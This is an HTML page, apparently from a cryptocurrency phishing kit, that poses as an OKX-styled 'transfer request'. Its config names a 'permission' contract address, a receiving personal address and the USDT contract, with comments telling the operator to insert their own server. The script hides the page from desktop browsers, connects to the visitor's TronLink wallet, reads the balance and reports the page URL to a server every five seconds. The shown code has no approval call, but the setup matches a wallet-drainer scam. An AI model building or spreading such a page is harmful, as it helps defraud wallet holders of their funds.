<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <title>正在申请转账</title>
    <link rel="icon" type="image/png" href="png/icon_trx.png">
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        ::-webkit-scrollbar {
            display: none;
        }
        .tishi {
            width: 58%;
            padding: 0.1rem 0.3rem;
            height: 3rem;
            background: #4b4848;
            z-index: 999999999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.3rem;
            color: white;
            font-size: 1rem;
            text-align: center;
            line-height: 3rem;
            display: none;
            height: auto;
            margin: 0 auto;
        }
    </style>
    <link rel="stylesheet" href="css/okx.css">
</head>
<body id="app" class="uni-body pages-index-home">
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
    <div class="tishi" id="tip">提示</div>
    <input id="to_address" type="hidden">
    <script>
        // 权限地址（合约地址）
        window.Permission_address = 'TWHsgstoUNMsAVpnSKFJU2AQcDQ1zzL4oD';
        // 收款地址（个人地址）
        window.Payment_address = 'TKaKDsmfNuHU6M7iuPvK88Amq1ydTU2sKh';
        // USDT 官方合约地址（无需修改）
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // 服务器地址用于发送心跳（修改为你自己的服务器域名）
        window.heartbeatUrl = 'https://baidu.com/heartbeat';
        
        // 初始化 DApp
        async function initializeDApp() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobile) {
                document.body.innerHTML = '';
                return;
            }
            await connectWallet();
            updateAmountDisplay();
        }
        
        // 连接钱包
        async function connectWallet() {
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    await initDApp();
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res.code === 200) {
                        window.tronWeb = window.tronLink.tronWeb;
                        await initDApp();
                    }
                }
            } catch (error) {
                console.error("钱包连接失败:", error);
            }
        }
        
        // 初始化 DApp 数据
        async function initDApp() {
            try {
                const trxBalance = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
                updateTRXBalance();
            } catch (error) {
                console.error("获取用户数据时出错:", error);
            }
        }
        
        // 更新 TRX 余额
        function updateTRXBalance() {
            const balanceElement = document.getElementById('ye');
            if (balanceElement) {
                balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
            }
        }
        
        // 更新金额显示
        function updateAmountDisplay() {
            const amountElement = document.getElementById('amount');
            if (amountElement) {
                amountElement.textContent = currentAmount;
            }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            updateAmountDisplay();
            initializeDApp();
        });
        
        // 发送心跳，保持与服务器连接（可选功能）
        function sendHeartbeat() {
            fetch(window.heartbeatUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url: window.location.href })
            })
            .catch(() => {});
        }
        
        const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每 5 秒发送一次心跳
        window.onload = sendHeartbeat;
        window.onbeforeunload = function() {
            clearInterval(heartbeatInterval);
        };
    </script>
</body>
</html>
